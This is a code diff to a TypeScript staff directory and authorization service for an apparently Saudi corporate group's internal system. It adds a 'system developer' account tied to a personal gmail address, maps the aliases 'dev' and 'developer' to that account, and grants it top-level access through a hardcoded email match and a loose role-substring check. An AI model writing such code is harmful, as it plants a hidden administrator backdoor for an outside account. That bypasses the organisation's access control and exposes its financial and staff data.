@@ -821,9 +821,20 @@ export const CORPORATE_STAFF_DIRECTORY: StaffDirectoryEntry[] = [
     full_name: 'أ. محمد بن عبدالرحمن السليم',
     role: 'المدير المالي التنفيذي للمجموعة (SMACC Group CFO)',
     company_id: 'all',
-    department_id: 'finance',
+    department_id: 'executive',
     branch: 'المقر الرئيسي للمجموعة - الرياض',
     badgeEmoji: '📊',
+  },
+  {
+    id: 'USR-GRP-DEV-01',
+    username: 'abdo12uk',
+    email: 'abdo12uk@gmail.com',
+    full_name: 'م. عبدالرحمن (مطور النظام الرئيسي)',
+    role: 'مطور النظام ومدير الصلاحيات العليا (System Developer)',
+    company_id: 'all',
+    department_id: 'executive',
+    branch: 'المقر الرئيسي للمجموعة - الرياض',
+    badgeEmoji: '💻',
   },
 ];
 
@@ -833,6 +844,10 @@ const USERNAME_EMAIL_ALIASES: Record<string, string> = {
   'admin': 'chairman@alsulaim.sa',
   'chairman': 'chairman@alsulaim.sa',
   'ceo': 'chairman@alsulaim.sa',
+  'developer': 'abdo12uk@gmail.com',
+  'dev': 'abdo12uk@gmail.com',
+  'abdo12uk': 'abdo12uk@gmail.com',
+  'abdo12uk@gmail.com': 'abdo12uk@gmail.com',
   'finance.manager': 'accounting@saf-rec.sa',
   'accounting': 'accounting@saf-rec.sa',
   'operation.user': 'musaned@saf-rec.sa',
@@ -1464,6 +1479,8 @@ export const authService = {
     return (
       user.department_id === 'executive' ||
       user.company_id === 'all' ||
+      user.email?.toLowerCase() === 'abdo12uk@gmail.com' ||
+      user.role.includes('مطور النظام') ||
       ['رئيس مجلس الإدارة', 'رئيس المجموعة', 'مدير نظام', 'مدير تنفيذي'].includes(user.role)
     );
   },
